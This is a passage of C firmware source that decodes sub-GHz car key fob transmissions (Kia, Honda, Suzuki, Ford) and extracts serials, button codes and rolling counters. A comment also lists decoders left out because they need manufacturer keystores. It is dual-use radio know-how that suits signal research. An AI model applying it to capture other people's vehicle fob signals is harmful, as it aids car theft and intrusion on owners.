    instance->decoder.te_last = 0;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->preamble_pairs = 0;
}

static void kia_v0_decoder_commit(
    PpDec_kia_v0* instance,
    uint64_t data,
    uint8_t type,
    uint16_t bit_count) {
    instance->type = type;
    instance->packet_bit_count = bit_count;
    instance->generic.data = data;
    instance->generic.data_count_bit = bit_count;

    KiaV0Fields scratch;
    kia_v0_parse_data(&instance->generic, type, &scratch, &instance->packet_bit_count);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    kia_v0_decoder_state_clear(instance);
}

static void kia_v0_decoder_finish_kia_or_honda_at_gap(PpDec_kia_v0* instance) {
    if(instance->decoder.decode_count_bit != KIA_V0_BIT_COUNT_KIA) {
        kia_v0_decoder_state_clear(instance);
        return;
    }

    const uint64_t data = instance->decoder.decode_data;
    if(kia_v0_verify_crc_poly(data)) {
        uint8_t type = KIA_V0_TYPE_KIA;
        if(instance->have_last_kia && (instance->last_kia_data == data) &&
           (instance->preamble_pairs >= KIA_V0_MITSU_PREAMBLE_MIN) &&
           (instance->preamble_pairs <= KIA_V0_MITSU_PREAMBLE_MAX)) {
            type = KIA_V0_TYPE_MITSU;
        }
        instance->last_kia_data = data;
        instance->have_last_kia = true;
        kia_v0_decoder_commit(instance, data, type, KIA_V0_BIT_COUNT_KIA);
        return;
    }

    const uint64_t raw = data & 0x0FFFFFFFFFFFFFFFULL;
    const uint64_t key = kia_v0_honda_transform(raw);
    if(kia_v0_honda_key_valid(key)) {
        kia_v0_decoder_commit(instance, key, KIA_V0_TYPE_HONDA, KIA_V0_BIT_COUNT_HONDA);
        return;
    }

    kia_v0_decoder_state_clear(instance);
}

static bool kia_v0_decoder_try_honda(PpDec_kia_v0* instance) {
    if(instance->decoder.decode_count_bit != KIA_V0_BIT_COUNT_KIA) {
        return false;
    }
    if(kia_v0_verify_crc_poly(instance->decoder.decode_data)) {
        return false;
    }

    const uint64_t raw = instance->decoder.decode_data & 0x0FFFFFFFFFFFFFFFULL;
    const uint64_t key = kia_v0_honda_transform(raw);
    if(!kia_v0_honda_key_valid(key)) {
        return false;
    }

    kia_v0_decoder_commit(instance, key, KIA_V0_TYPE_HONDA, KIA_V0_BIT_COUNT_HONDA);
    return true;
}

static void* kia_v0_alloc(void) {
    PpDec_kia_v0* i = (PpDec_kia_v0*)calloc(1, sizeof(PpDec_kia_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void kia_v0_reset(void* context) {
    PpDec_kia_v0* instance = (PpDec_kia_v0*)context;
    kia_v0_decoder_state_clear(instance);
    instance->type = 0;
    instance->have_last_kia = false;
    instance->last_kia_data = 0;
}

static void kia_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v0* instance = (PpDec_kia_v0*)context;

    switch(instance->decoder.parser_step) {
    case KiaV0DecoderStepReset:
        kia_v0_decoder_state_clear(instance);
        if(!level) {
            break;
        }
        if(!kia_v0_is_short(duration, &kia_protocol_v0_const)) {
            break;
        }
        instance->decoder.parser_step = KiaV0DecoderStepPreamble;
        instance->decoder.te_last = duration;
        instance->preamble_pairs = 0;
        break;

    case KiaV0DecoderStepPreamble:
        if(level) {
            if(kia_v0_is_short(duration, &kia_protocol_v0_const) ||
               kia_v0_is_long(duration, &kia_protocol_v0_const)) {
                instance->decoder.te_last = duration;
            } else {
                kia_v0_decoder_state_clear(instance);
            }
        } else if(
            kia_v0_is_short(duration, &kia_protocol_v0_const) &&
            kia_v0_is_short(instance->decoder.te_last, &kia_protocol_v0_const)) {
            instance->preamble_pairs++;
        } else if(
            kia_v0_is_long(duration, &kia_protocol_v0_const) &&
            kia_v0_is_long(instance->decoder.te_last, &kia_protocol_v0_const)) {
            if(instance->preamble_pairs > 14U) {
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                subghz_protocol_blocks_add_bit(&instance->decoder, 1U);
                subghz_protocol_blocks_add_bit(&instance->decoder, 1U);
                instance->decoder.parser_step = KiaV0DecoderStepSaveDuration;
            } else {
                kia_v0_decoder_state_clear(instance);
            }
        } else {
            kia_v0_decoder_state_clear(instance);
        }
        break;

    case KiaV0DecoderStepSaveDuration:
        if(!level) {
            kia_v0_decoder_state_clear(instance);
            break;
        }

        if(kia_v0_is_kia_gap(duration)) {
            kia_v0_decoder_finish_kia_or_honda_at_gap(instance);
            break;
        }

        if(kia_v0_is_suzuki_gap_strict(duration) &&
           kia_v0_is_suzuki_gap_strict(instance->decoder.te_last)) {
            if(instance->decoder.decode_count_bit == KIA_V0_BIT_COUNT_SUZUKI) {
                uint64_t shifted = 0;
                if(kia_v0_suzuki_resolve_shifted(instance->decoder.decode_data, &shifted)) {
                    kia_v0_decoder_commit(
                        instance, shifted, KIA_V0_TYPE_SUZUKI, KIA_V0_BIT_COUNT_SUZUKI);
                } else {
                    kia_v0_decoder_state_clear(instance);
                }
            } else {
                kia_v0_decoder_state_clear(instance);
            }
            break;
        }

        if(kia_v0_is_short(duration, &kia_protocol_v0_const) ||
           kia_v0_is_long(duration, &kia_protocol_v0_const)) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = KiaV0DecoderStepCheckDuration;
        } else {
            kia_v0_decoder_state_clear(instance);
        }
        break;

    case KiaV0DecoderStepCheckDuration:
        if(level) {
            kia_v0_decoder_state_clear(instance);
            break;
        }

        if(kia_v0_is_short(instance->decoder.te_last, &kia_protocol_v0_const) &&
           kia_v0_is_short(duration, &kia_protocol_v0_const)) {
            subghz_protocol_blocks_add_bit(&instance->decoder, 0U);
            if(!kia_v0_decoder_try_honda(instance)) {
                instance->decoder.parser_step = KiaV0DecoderStepSaveDuration;
            }
            break;
        }

        if(kia_v0_is_long(instance->decoder.te_last, &kia_protocol_v0_const) &&
           kia_v0_is_long(duration, &kia_protocol_v0_const)) {
            subghz_protocol_blocks_add_bit(&instance->decoder, 1U);
            if(!kia_v0_decoder_try_honda(instance)) {
                instance->decoder.parser_step = KiaV0DecoderStepSaveDuration;
            }
            break;
        }

        if(kia_v0_is_suzuki_gap_strict(duration)) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = KiaV0DecoderStepSaveDuration;
            break;
        }

        if(!kia_v0_decoder_try_honda(instance)) {
            kia_v0_decoder_state_clear(instance);
        }
        break;

    default:
        kia_v0_decoder_state_clear(instance);
        break;
    }
}

/* ============================================================================
 * Kia V1 decoder — ProtoPirate (GPLv3)
 * Manchester-coded 57-bit rolling frame.
 * ==========================================================================*/

static const SubGhzBlockConst kia_protocol_v1_const = {
    .te_short = 800,
    .te_long = 1600,
    .te_delta = 200,
    .min_count_bit_for_found = 57,
};

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;
    ManchesterState manchester_saved_state;
    uint8_t crc;
    bool crc_check;
} PpDec_kia_v1;

typedef enum {
    KiaV1DecoderStepReset = 0,
    KiaV1DecoderStepCheckPreamble,
    KiaV1DecoderStepDecodeData,
} KiaV1DecoderStep;

static void* kia_v1_alloc(void) {
    PpDec_kia_v1* i = (PpDec_kia_v1*)calloc(1, sizeof(PpDec_kia_v1));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V1";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void kia_v1_reset(void* context) {
    PpDec_kia_v1* instance = (PpDec_kia_v1*)context;
    instance->decoder.parser_step = KiaV1DecoderStepReset;
}

static void kia_v1_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v1* instance = (PpDec_kia_v1*)context;

    ManchesterEvent event = ManchesterEventReset;

    switch(instance->decoder.parser_step) {
    case KiaV1DecoderStepReset:
        if((level) && (DURATION_DIFF(duration, kia_protocol_v1_const.te_long) <
                       kia_protocol_v1_const.te_delta)) {
            instance->decoder.parser_step = KiaV1DecoderStepCheckPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 0;
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            manchester_advance(
                instance->manchester_saved_state,
                ManchesterEventReset,
                &instance->manchester_saved_state,
                NULL);
        }
        break;

    case KiaV1DecoderStepCheckPreamble:
        if(!level) {
            if((DURATION_DIFF(duration, kia_protocol_v1_const.te_long) <
                kia_protocol_v1_const.te_delta) &&
               (DURATION_DIFF(instance->decoder.te_last, kia_protocol_v1_const.te_long) <
                kia_protocol_v1_const.te_delta)) {
                instance->header_count++;
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = KiaV1DecoderStepReset;
            }
        }
        if(instance->header_count > 70) {
            if((!level) &&
               (DURATION_DIFF(duration, kia_protocol_v1_const.te_short) <
                kia_protocol_v1_const.te_delta) &&
               (DURATION_DIFF(instance->decoder.te_last, kia_protocol_v1_const.te_long) <
                kia_protocol_v1_const.te_delta)) {
                instance->decoder.decode_count_bit = 1;
                subghz_protocol_blocks_add_bit(&instance->decoder, 1);
                instance->header_count = 0;
                instance->decoder.parser_step = KiaV1DecoderStepDecodeData;
            }
        }
        break;

    case KiaV1DecoderStepDecodeData:
        event = pp_manchester_event(duration, level, &kia_protocol_v1_const);

        if(event != ManchesterEventReset) {
            bool data;
            bool data_ok = manchester_advance(
                instance->manchester_saved_state, event, &instance->manchester_saved_state, &data);
            if(data_ok) {
                instance->decoder.decode_data = (instance->decoder.decode_data << 1) | data;
                instance->decoder.decode_count_bit++;
            }
        }

        if(instance->decoder.decode_count_bit == kia_protocol_v1_const.min_count_bit_for_found) {
            instance->generic.data = instance->decoder.decode_data;
            instance->generic.data_count_bit = instance->decoder.decode_count_bit;
            if(instance->base.callback)
                instance->base.callback(&instance->base, instance->base.context);

            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            instance->decoder.parser_step = KiaV1DecoderStepReset;
        }
        break;
    }
}

/* ============================================================================
 * Kia V7 decoder — ProtoPirate (GPLv3)
 * Manchester-coded 64-bit frame with 0x4C header + CRC8.
 * ==========================================================================*/

#define KIA_V7_PREAMBLE_MIN_PAIRS 16
#define KIA_V7_HEADER             0x4C
#define KIA_V7_KEY_BITS           64U

static const SubGhzBlockConst kia_protocol_v7_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = KIA_V7_KEY_BITS,
};

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint16_t preamble_count;

    uint8_t decoded_button;
    uint8_t fixed_high_byte;
    uint8_t crc_calculated;
    uint8_t crc_raw;
    bool crc_valid;
} PpDec_kia_v7;

typedef enum {
    KiaV7DecoderStepReset = 0,
    KiaV7DecoderStepPreamble = 1,
    KiaV7DecoderStepSyncLow = 2,
    KiaV7DecoderStepData = 3,
} KiaV7DecoderStep;

#define kia_v7_crc8(data, len) subghz_protocol_blocks_crc8((data), (len), 0x7F, 0x4C)

static bool kia_v7_is_short(uint32_t d, const SubGhzBlockConst* c) {
    return DURATION_DIFF(d, c->te_short) < c->te_delta;
}
static bool kia_v7_is_long(uint32_t d, const SubGhzBlockConst* c) {
    return DURATION_DIFF(d, c->te_long) < c->te_delta;
}

static void kia_v7_decode_key_common(
    SubGhzBlockGeneric* generic,
    uint8_t* decoded_button,
    uint8_t* fixed_high_byte,
    uint8_t* crc_calculated,
    uint8_t* crc_raw,
    bool* crc_valid) {
    uint8_t bytes[8];
    pp_u64_to_bytes_be(generic->data, bytes);

    const uint32_t serial = (((uint32_t)bytes[3]) << 20U) | (((uint32_t)bytes[4]) << 12U) |
                            (((uint32_t)bytes[5]) << 4U) | (((uint32_t)bytes[6]) >> 4U);
    const uint16_t counter = ((uint16_t)bytes[1] << 8U) | (uint16_t)bytes[2];
    const uint8_t button = bytes[6] & 0x0FU;
    const uint8_t crc_calc = kia_v7_crc8(bytes, 7);
    const uint8_t crc_pkt = bytes[7];

    generic->serial = serial & 0x0FFFFFFFU;
    generic->btn = button;
    generic->cnt = counter;
    generic->data_count_bit = KIA_V7_KEY_BITS;

    if(decoded_button) {
        *decoded_button = button;
    }
    if(fixed_high_byte) {
        *fixed_high_byte = bytes[0];
    }
    if(crc_calculated) {
        *crc_calculated = crc_calc;
    }
    if(crc_raw) {
        *crc_raw = crc_pkt;
    }
    if(crc_valid) {
        *crc_valid = (crc_calc == crc_pkt);
    }
}

static void kia_v7_decode_key_decoder(PpDec_kia_v7* instance) {
    kia_v7_decode_key_common(
        &instance->generic,
        &instance->decoded_button,
        &instance->fixed_high_byte,
        &instance->crc_calculated,
        &instance->crc_raw,
        &instance->crc_valid);
}

static void* kia_v7_alloc(void) {
    PpDec_kia_v7* i = (PpDec_kia_v7*)calloc(1, sizeof(PpDec_kia_v7));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V7";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void kia_v7_reset(void* context) {
    PpDec_kia_v7* instance = (PpDec_kia_v7*)context;
    instance->decoder.parser_step = KiaV7DecoderStepReset;
    instance->decoder.te_last = 0;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->preamble_count = 0;
    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

static void kia_v7_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v7* instance = (PpDec_kia_v7*)context;
    ManchesterEvent event = ManchesterEventReset;
    bool data = false;

    switch(instance->decoder.parser_step) {
    case KiaV7DecoderStepReset:
        if(level && kia_v7_is_short(duration, &kia_protocol_v7_const)) {
            instance->decoder.parser_step = KiaV7DecoderStepPreamble;
            instance->decoder.te_last = duration;
            instance->preamble_count = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        break;

    case KiaV7DecoderStepPreamble:
        if(level) {
            if(kia_v7_is_long(duration, &kia_protocol_v7_const) &&
               kia_v7_is_short(instance->decoder.te_last, &kia_protocol_v7_const)) {
                if(instance->preamble_count > (KIA_V7_PREAMBLE_MIN_PAIRS - 1U)) {
                    instance->decoder.decode_data = 0;
                    instance->decoder.decode_count_bit = 0;
                    instance->preamble_count = 0;

                    subghz_protocol_blocks_add_bit(&instance->decoder, 1U);
                    subghz_protocol_blocks_add_bit(&instance->decoder, 0U);
                    subghz_protocol_blocks_add_bit(&instance->decoder, 1U);
                    subghz_protocol_blocks_add_bit(&instance->decoder, 1U);

                    instance->decoder.te_last = duration;
                    instance->decoder.parser_step = KiaV7DecoderStepSyncLow;
                } else {
                    instance->decoder.parser_step = KiaV7DecoderStepReset;
                }
            } else if(kia_v7_is_short(duration, &kia_protocol_v7_const)) {
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = KiaV7DecoderStepReset;
            }
        } else {
            if(kia_v7_is_short(duration, &kia_protocol_v7_const) &&
               kia_v7_is_short(instance->decoder.te_last, &kia_protocol_v7_const)) {
                instance->preamble_count++;
            } else {
                instance->decoder.parser_step = KiaV7DecoderStepReset;
            }
        }
        break;

    case KiaV7DecoderStepSyncLow:
        if(!level && kia_v7_is_short(duration, &kia_protocol_v7_const) &&
           kia_v7_is_long(instance->decoder.te_last, &kia_protocol_v7_const)) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = KiaV7DecoderStepData;
        }
        break;

    case KiaV7DecoderStepData: {
        if(kia_v7_is_short(duration, &kia_protocol_v7_const)) {
            event = (ManchesterEvent)((uint8_t)(level & 1U) << 1U);
        } else if(kia_v7_is_long(duration, &kia_protocol_v7_const)) {
            event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        } else {
            event = ManchesterEventReset;
        }

        if(kia_v7_is_short(duration, &kia_protocol_v7_const) ||
           kia_v7_is_long(duration, &kia_protocol_v7_const)) {
            if(manchester_advance(
                   instance->manchester_state, event, &instance->manchester_state, &data)) {
                subghz_protocol_blocks_add_bit(&instance->decoder, data);
            }
        }

        if(instance->decoder.decode_count_bit == KIA_V7_KEY_BITS) {
            const uint64_t candidate = ~instance->decoder.decode_data;
            const uint8_t hdr = (uint8_t)((candidate >> 56U) & 0xFFU);

            if(hdr == KIA_V7_HEADER) {
                instance->generic.data = candidate;
                instance->generic.data_count_bit = KIA_V7_KEY_BITS;
                kia_v7_decode_key_decoder(instance);

                if(instance->crc_valid) {
                    if(instance->base.callback) {
                        instance->base.callback(&instance->base, instance->base.context);
                    }
                } else {
                    instance->generic.data = 0;
                    instance->generic.data_count_bit = 0;
                }

                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->decoder.parser_step = KiaV7DecoderStepReset;
                manchester_advance(
                    instance->manchester_state,
                    ManchesterEventReset,
                    &instance->manchester_state,
                    NULL);
            } else {
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->decoder.parser_step = KiaV7DecoderStepReset;
                manchester_advance(
                    instance->manchester_state,
                    ManchesterEventReset,
                    &instance->manchester_state,
                    NULL);
            }
        }

        break;
    }
    }
}

/* ============================================================================
 * REGISTRY + UNRESOLVED REPORT
 *
 * (a) REGISTRY — ported decoders:
 *     { "Kia V0", kia_v0_alloc, kia_v0_feed, kia_v0_reset, nullptr },
 *     { "Kia V1", kia_v1_alloc, kia_v1_feed, kia_v1_reset, nullptr },
 *     { "Kia V7", kia_v7_alloc, kia_v7_feed, kia_v7_reset, nullptr },
 *
 *     Note: kia_v0 / kia_v7 needed only pp_is_short / pp_is_long from
 *     protocols_common (both trivial DURATION_DIFF predicates). These were
 *     re-implemented as local static helpers (kia_v0_is_short/is_long,
 *     kia_v7_is_short/is_long) built solely on the shim's DURATION_DIFF macro,
 *     so the decoders remain self-contained against the shim.
 *
 * (b) UNRESOLVED — decoders NOT emitted (feed/reset depend on symbols that are
 *     neither in the shim nor defined in the source .c file):
 *
 *     Kia V3/V4 (kia_v3_v4.c):
 *         - subghz_protocol_keeloq_common_decrypt   (keeloq_common.h)
 *         - get_kia_mf_key                          (keys.h)
 *         (reached via kia_v3_v4_process_buffer from the decode feed path)
 *
 *     Kia V5 (kia_v5.c):
 *         - get_kia_v5_key                          (keys.h)
 *         (reached via mixer_decode -> build_keystore_from_mfkey from the feed
 *          Data step)
 *
 *     Kia V6 (kia_v6.c):
 *         - get_kia_v6_keystore_a                   (keys.h)
 *         - get_kia_v6_keystore_b                   (keys.h)
 *         (reached via kia_v6_decrypt -> get_kia_v6_aes_key from the feed path;
 *          the AES tables/routines themselves are in-file and would be fine, but
 *          the keystore accessors are not)
 * ==========================================================================*/


// ===== fragment: pp_frag_fordhonda.h =====
// =============================================================================
// pp_frag_fordhonda.h
// Self-contained Ford / Honda sub-GHz DECODER fragment for ESP32 firmware.
// Ported from the ProtoPirate project (GPLv3). Only the DECODE path of each
// protocol is transformed; encoders / serialize / registration are dropped.
// Requires the ProtoPirate compatibility shim to be included BEFORE this file.
// No #pragma once, no #include — paste into a translation unit that has the shim.
// =============================================================================

// =============================================================================
// Ford V0 — ProtoPirate (GPLv3)
// =============================================================================

static const SubGhzBlockConst ford_v0_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = 64,
};

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;

    uint64_t data_low;
    uint64_t data_high;
    uint8_t bit_count;

    uint16_t header_count;

    uint64_t key1;
    uint16_t key2;
    uint32_t serial;
    uint8_t button;
    uint32_t count;
} PpDec_ford_v0;

typedef enum {
    FordV0DecoderStepReset = 0,
    FordV0DecoderStepPreamble,
    FordV0DecoderStepPreambleCheck,
    FordV0DecoderStepGap,
    FordV0DecoderStepData,
} FordV0DecoderStep;

static void decode_ford_v0(
    uint64_t key1,
    uint16_t key2,
    uint32_t* serial,
    uint8_t* button,
    uint32_t* count) {
    uint8_t buf[13] = {0};

    for(int i = 0; i < 8; ++i) {
        buf[i] = (uint8_t)(key1 >> (56 - i * 8));
    }

    buf[8] = (uint8_t)(key2 >> 8);
    buf[9] = (uint8_t)(key2 & 0xFF);

    uint8_t tmp = buf[8];
    uint8_t parity = 0;
    uint8_t parity_any = (tmp != 0);
    while(tmp) {
        parity ^= (tmp & 1);
        tmp >>= 1;
    }
    buf[11] = parity_any ? parity : 0;

    uint8_t xor_byte;
    uint8_t limit;
    if(buf[11]) {
        xor_byte = buf[7];
        limit = 7;
    } else {
        xor_byte = buf[6];
        limit = 6;
    }

    for(int idx = 1; idx < limit; ++idx) {
        buf[idx] ^= xor_byte;
    }

    if(buf[11] == 0) {
        buf[7] ^= xor_byte;
    }

    uint8_t orig_b7 = buf[7];
    buf[7] = (orig_b7 & 0xAA) | (buf[6] & 0x55);
    uint8_t mixed = (buf[6] & 0xAA) | (orig_b7 & 0x55);
    buf[12] = mixed;
    buf[6] = mixed;

    uint32_t serial_le = ((uint32_t)buf[1]) | ((uint32_t)buf[2] << 8) | ((uint32_t)buf[3] << 16) |
                         ((uint32_t)buf[4] << 24);

    *serial = ((serial_le & 0xFF) << 24) | (((serial_le >> 8) & 0xFF) << 16) |
              (((serial_le >> 16) & 0xFF) << 8) | ((serial_le >> 24) & 0xFF);

    *button = (buf[5] >> 3) & 0x0F;

    *count = ((buf[5] & 0x07) << 16) | (buf[6] << 8) | buf[7];
}

static void ford_v0_add_bit(PpDec_ford_v0* instance, bool bit) {
    uint32_t low = (uint32_t)instance->data_low;
    instance->data_low = (instance->data_low << 1) | (bit ? 1 : 0);
    instance->data_high = (instance->data_high << 1) | ((low >> 31) & 1);
    instance->bit_count++;
}

static bool ford_v0_process_data(PpDec_ford_v0* instance) {
    if(instance->bit_count == 64) {
        uint64_t combined = ((uint64_t)instance->data_high << 32) | instance->data_low;
        instance->key1 = ~combined;
        instance->data_low = 0;
        instance->data_high = 0;
        return false;
    }

    if(instance->bit_count == 80) {
        uint16_t key2_raw = (uint16_t)(instance->data_low & 0xFFFF);
        uint16_t key2 = ~key2_raw;

        decode_ford_v0(
            instance->key1, key2, &instance->serial, &instance->button, &instance->count);

        instance->key2 = key2;
        return true;
    }

    return false;
}

static void* ford_v0_alloc() {
    PpDec_ford_v0* i = (PpDec_ford_v0*)calloc(1, sizeof(PpDec_ford_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Ford V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void ford_v0_reset(void* context) {
    PpDec_ford_v0* instance = (PpDec_ford_v0*)context;

    instance->decoder.parser_step = FordV0DecoderStepReset;
    instance->decoder.te_last = 0;
    instance->manchester_state = ManchesterStateMid1;
    instance->data_low = 0;
    instance->data_high = 0;
    instance->bit_count = 0;
    instance->header_count = 0;
    instance->key1 = 0;
    instance->key2 = 0;
    instance->serial = 0;
    instance->button = 0;
    instance->count = 0;
}

static void ford_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_ford_v0* instance = (PpDec_ford_v0*)context;

    uint32_t te_short = ford_v0_const.te_short;
    uint32_t te_long = ford_v0_const.te_long;
    uint32_t te_delta = ford_v0_const.te_delta;
    uint32_t gap_threshold = 3500;

    switch(instance->decoder.parser_step) {
    case FordV0DecoderStepReset:
        if(level && (DURATION_DIFF(duration, te_short) < te_delta)) {
            instance->data_low = 0;
            instance->data_high = 0;
            instance->decoder.parser_step = FordV0DecoderStepPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 0;
            instance->bit_count = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        break;

    case FordV0DecoderStepPreamble:
        if(!level) {
            if(DURATION_DIFF(duration, te_long) < te_delta) {
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = FordV0DecoderStepPreambleCheck;
            } else {
                instance->decoder.parser_step = FordV0DecoderStepReset;
            }
        }
        break;

    case FordV0DecoderStepPreambleCheck:
        if(level) {
            if(DURATION_DIFF(duration, te_long) < te_delta) {
                instance->header_count++;
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = FordV0DecoderStepPreamble;
            } else if(DURATION_DIFF(duration, te_short) < te_delta) {
                instance->decoder.parser_step = FordV0DecoderStepGap;
            } else {
                instance->decoder.parser_step = FordV0DecoderStepReset;
            }
        }
        break;

    case FordV0DecoderStepGap:
        if(!level && (DURATION_DIFF(duration, gap_threshold) < 250)) {
            instance->data_low = 1;
            instance->data_high = 0;
            instance->bit_count = 1;
            instance->decoder.parser_step = FordV0DecoderStepData;
        } else if(!level && duration > gap_threshold + 250) {
            instance->decoder.parser_step = FordV0DecoderStepReset;
        }
        break;

    case FordV0DecoderStepData: {
        ManchesterEvent event =
            pp_manchester_event(duration, level, &ford_v0_const);
        if(event == ManchesterEventReset) {
            instance->decoder.parser_step = FordV0DecoderStepReset;
            break;
        }

        bool data_bit;
        if(manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            ford_v0_add_bit(instance, data_bit);

            if(ford_v0_process_data(instance)) {
                instance->generic.data = instance->key1;
                instance->generic.data_count_bit = 64;
                instance->generic.serial = instance->serial;
                instance->generic.btn = instance->button;
                instance->generic.cnt = instance->count;

                if(instance->base.callback) {
                    instance->base.callback(&instance->base, instance->base.context);
                }

                instance->data_low = 0;
                instance->data_high = 0;
                instance->bit_count = 0;
                instance->decoder.parser_step = FordV0DecoderStepReset;
            }
        }

        instance->decoder.te_last = duration;
        break;
    }
    }
}

// =============================================================================
// Ford V2 — ProtoPirate (GPLv3)
// =============================================================================

#define FORD_V2_TE_SHORT               200U
#define FORD_V2_TE_LONG                400U
#define FORD_V2_TE_DELTA               260U
#define FORD_V2_INTER_BURST_GAP_US     15000U
#define FORD_V2_PREAMBLE_MIN           64U
#define FORD_V2_DATA_BITS              104U
#define FORD_V2_DATA_BYTES             13U
#define FORD_V2_SYNC_0                 0x7FU
#define FORD_V2_SYNC_1                 0xA7U
#define FORD_V2_SYNC_BITS                  16U
#define FORD_V2_POST_SYNC_DECODE_COUNT_BIT 16U
#define FORD_V2_KEY_BYTE_COUNT             8U
#define FORD_V2_TAIL_RAW_BYTE_COUNT        5U
#define FORD_V2_PREAMBLE_COUNT_MAX         0xFFFFU

static const uint16_t ford_v2_sync_shift16_inv =
    (uint16_t)(~(((uint16_t)FORD_V2_SYNC_0 << 8) | (uint16_t)FORD_V2_SYNC_1));

static const SubGhzBlockConst ford_v2_const = {
    .te_short = FORD_V2_TE_SHORT,
    .te_long = FORD_V2_TE_LONG,
    .te_delta = FORD_V2_TE_DELTA,
    .min_count_bit_for_found = FORD_V2_DATA_BITS,
};

typedef enum {
    FordV2DecoderStepReset = 0,
    FordV2DecoderStepPreamble = 1,
    FordV2DecoderStepSync = 2,
    FordV2DecoderStepData = 3,
} FordV2DecoderStep;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint16_t preamble_count;

    uint8_t raw_bytes[FORD_V2_DATA_BYTES];
    uint8_t byte_count;

    uint16_t sync_shift;
    uint8_t sync_bit_count;

    uint64_t extra_data;
    uint16_t counter16;
    uint32_t tail31;
    bool structure_ok;
} PpDec_ford_v2;

static void ford_v2_decoder_manchester_feed_event(
    PpDec_ford_v2* instance,
    ManchesterEvent event);

static void ford_v2_decoder_reset_state(PpDec_ford_v2* instance) {
    instance->decoder.parser_step = FordV2DecoderStepReset;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->decoder.te_last = 0;

    instance->byte_count = 0;
    instance->sync_shift = 0;
    instance->sync_bit_count = 0;
    instance->preamble_count = 0;
    instance->counter16 = 0;
    instance->tail31 = 0;
    instance->structure_ok = false;

    memset(instance->raw_bytes, 0, sizeof(instance->raw_bytes));

    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

static bool ford_v2_duration_is_short(uint32_t duration) {
    return DURATION_DIFF(duration, FORD_V2_TE_SHORT) < (int32_t)FORD_V2_TE_DELTA;
}

static bool ford_v2_duration_is_long(uint32_t duration) {
    return DURATION_DIFF(duration, FORD_V2_TE_LONG) < (int32_t)FORD_V2_TE_DELTA;
}

static bool ford_v2_button_is_valid(uint8_t btn) {
    switch(btn) {
    case 0x10:
    case 0x11:
    case 0x13:
    case 0x14:
    case 0x15:
        return true;
    default:
        return false;
    }
}

static void ford_v2_decoder_extract_from_raw(PpDec_ford_v2* instance) {
    const uint8_t* k = instance->raw_bytes;

    instance->generic.serial = ((uint32_t)k[2] << 24) | ((uint32_t)k[3] << 16) |
                               ((uint32_t)k[4] << 8) | (uint32_t)k[5];

    instance->generic.btn = k[6];

    instance->counter16 = (uint16_t)((((uint16_t)(k[7] & 0x7FU)) << 9) | (((uint16_t)k[8]) << 1) |
                                     ((uint16_t)(k[9] >> 7)));

    instance->generic.cnt = instance->counter16;

    instance->tail31 = (((uint32_t)(k[9] & 0x7FU)) << 24) | ((uint32_t)k[10] << 16) |
                       ((uint32_t)k[11] << 8) | (uint32_t)k[12];

    instance->structure_ok = true;

    if(k[0] != FORD_V2_SYNC_0) instance->structure_ok = false;
    if(k[1] != FORD_V2_SYNC_1) instance->structure_ok = false;
    if(!ford_v2_button_is_valid(k[6])) instance->structure_ok = false;

    if((k[7] & 0x7FU) != (uint8_t)((instance->counter16 >> 9) & 0x7FU)) {
        instance->structure_ok = false;
    }

    if(k[8] != (uint8_t)((instance->counter16 >> 1) & 0xFFU)) {
        instance->structure_ok = false;
    }

    if(((k[9] >> 7) & 1U) != (uint8_t)(instance->counter16 & 1U)) {
        instance->structure_ok = false;
    }

    instance->generic.data = 0;
